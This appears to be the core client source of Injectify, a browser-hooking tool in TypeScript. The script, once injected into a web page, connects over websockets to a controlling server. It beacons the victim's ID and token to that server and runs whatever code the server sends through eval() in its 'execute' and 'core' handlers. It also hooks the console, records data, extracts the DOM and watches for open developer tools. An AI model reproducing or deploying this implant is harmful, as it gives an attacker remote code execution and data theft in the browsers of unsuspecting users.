import { Injectify } from '../definitions/core'
import { ws } from './components/Websockets'

// Components
import { Modules } from './components/Modules'
import Console from './components/Console'
import DOMExtractor from './components/DOMExtractor'
import DevtoolsListener from './components/Devtools/Listener'
import * as Websockets from './components/Websockets'
import DataRecorder from './components/DataRecorder'
import { Info, SessionInfo } from './components/Info'
import AutoRun from './components/AutoRun'

// Libraries
import LoadJS from './lib/LoadJS'
import ErrorGuard from './lib/ErrorGuard'
import Heartbeat from './lib/Heartbeat'

// Polyfills
import Promise from './lib/Promise'

ErrorGuard(() => {
  let reconnected = !!(<any>window).injectify

  /**
   * Injectify core API
   * @class
   */
  const injectify = (<any>window).injectify = class Injectify {
    /**
     * Console logging
     */
    static log = Console.log
    static warn = Console.warn
    static error = Console.error
    static result = Console.result
    static table = Console.table
    static console = Console.hook

    /**
     * Data recorder
     */
    static record = DataRecorder.record

    /**
     * Devtools monitoring
     */
    static devtools = {
      open: false,
      orientation: null
    }
    static DevtoolsListener = DevtoolsListener

    /**
     * Websocket functions
     */
    static listener = Websockets.Listener
    static listen = Websockets.Listen
    static unlisten = Websockets.Unlisten
    static send = Websockets.Send
    static ping = Websockets.Ping

    static get DOMExtractor() {
      return DOMExtractor()
    }

    /**
     * Module loader
     */
    static module = Modules.loadModule
    static app = Modules.loadApp

    static LoadJS = LoadJS

    static auth(token?: string) {
      let auth = new Image()
      if (token) {
        auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(
          this.info.id && this.info.id.toString()
        )}&token=${encodeURIComponent(token)}&z=${+new Date()}`
      } else {
        /**
         * Send a connection request to the server
         *
         * 1. Make a request to /a with our socket connection ID
         * 2. Server reads cookies and attempts to find our token
         * 3. If it can't be found it, the server sets a new cookie
         * 4. Server gets the passed socket ID and inserts us into database
         * 5. All this is done server-side with the below two lines
         */
        auth.src = `${this.info.server.url}/a?id=${encodeURIComponent(
          this.info.id && this.info.id.toString()
        )}&z=${+new Date()}`
      }
      /**
       * Make sure request is sent
       */
      auth.onload
    }

    /**
     * Info
     */
    static get info() {
      return Info()
    }
    static session = SessionInfo
    static connectTime = +new Date()

    static debug: boolean = ws.url.split('?')[1].charAt(0) === '$'

    static debugLog(
      internalName: string = 'generic',
      level: 'info' | 'debug' | 'warn' | 'error' = 'debug',
      ...message: any[]
    ): void {
      /// #if DEBUG
      let emoji = '📝'
      switch (internalName) {
        case 'websockets':
          emoji = '📶'
          break
        case 'heartbeat':
          emoji = '💗'
          break
        case 'core':
          emoji = '⚡️'
          break
        case 'module':
          emoji = '📦'
          break
        case 'window-injection':
          emoji = '💉'
          break
        case 'page-ghost':
          emoji = '👻'
          break
        case 'session-info':
          emoji = '🕵🏼'
          break
        case 'rate-limiter':
          emoji = '📛'
          break
      }

      message.unshift(
        `${emoji} [${internalName
          .split('-')
          .join(' ')
          .replace(/\w\S*/g, function(txt) {
            return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase()
          })}]:`
      )

      if (internalName === 'core') {
        message = [
          `%c %c${emoji} Injectify core.ts loaded!${
            this.info.server.cached ? ' (FROM CACHE)' : ''
          }`,
          `padding: 3px 10px; line-height: 20px; background: url("https://github.com/samdenty99/injectify/blob/master/assets/injectify.png?raw=true"); background-repeat: no-repeat; background-size: 20px 20px; color: transparent;`,
          ``,
          injectify.info
        ]
      }
      console[level].apply(this, message)
      /// #endif
    }

    static get duration(): number {
      let duration = (+new Date() - this['connectTime']) / 1000
      return Math.round(duration)
    }

    static get global(): Injectify.global {
      return (
        (<any>window).inJl1 ||
        ((<any>window).inJl1 = {
          listeners: {
            visibility: false,
            timed: {
              active: false,
              timer: null
            },
            pinger: null,
            devtools: false,
            websocket: {}
          },
          windowInjection: false,
          commandHistory: [],
          modules: {
            states: {},
            calls: {}
          },
          vows: {},
          scroll: {
            order: -1,
            id: null,
            x: -1,
            y: -1
          }
        })
      )
    }

    static setState(newState: any) {
      this.global
      Object.keys(newState).forEach((state) => {
        window['inJl1'][state] = newState[state]
      })
    }
  } as typeof Injectify

  // Re-connect events
  if (reconnected) {
    /// #if DEBUG
    injectify.debugLog(
      'websockets',
      'info',
      'Re-established a connection to the server ✅'
    )
    /// #endif
  } else {
    window.dispatchEvent(new CustomEvent('injectify'))
  }

  // Debug helpers
  /// #if DEBUG
  injectify.debugLog(
    'core',
    'warn',
    'Injectify core.ts loaded! => https://github.com/samdenty99/injectify',
    injectify.info
  )
  /// #endif

  // Replace the basic websocket handler with a feature-rich one
  injectify.listener((data, topic) => {
    switch (topic) {
      case 'cpr': {
        /// #if DEBUG
        injectify.debugLog(
          'heartbeat',
          'warn',
          `Client is not sending regular heartbeat packets! attempting to keep connection with the server open...`
        )
        /// #endif
        Heartbeat(true)
        break
      }
      case 'rate-limiter': {
        /// #if DEBUG
        injectify.debugLog(
          'rate-limiter',
          'error',
          `Could not complete request!`,
          data
        )
        /// #endif
        break
      }
      case 'error': {
        /// #if DEBUG
        console.error(JSON.stringify(data))
        /// #endif
        break
      }
      case 'module': {
        new Modules.loader(data)
        break
      }
      case 'v': {
        Websockets.Vow(data[0], data[1], data[2])
        break
      }
      case 'execute': {
        ;(() => {
          let history = injectify.global.commandHistory
          history.push(data)
          injectify.setState({
            commandHistory: history
          })
        })()
        ErrorGuard(() => {
          injectify.result(eval(data))
        })
        break
      }
      case 'scroll': {
        let x = data[0]
        let y = data[1]
        let id = data[2]
        let order = data[3]
        if (injectify.global.scroll.order < order) {
          let element = document.querySelector(`[_-_=${JSON.stringify(id)}]`)
          if (element) {
            element.scrollTop = y
            element.scrollLeft = x
          }
          injectify.global.scroll = {
            ...injectify.global.scroll,
            x,
            y,
            id,
            order
          }
        }
        break
      }
      case 'core': {
        eval(data)
        break
      }
      default: {
        break
      }
    }
  })

  // Run startup scripts
  AutoRun()
}, true)
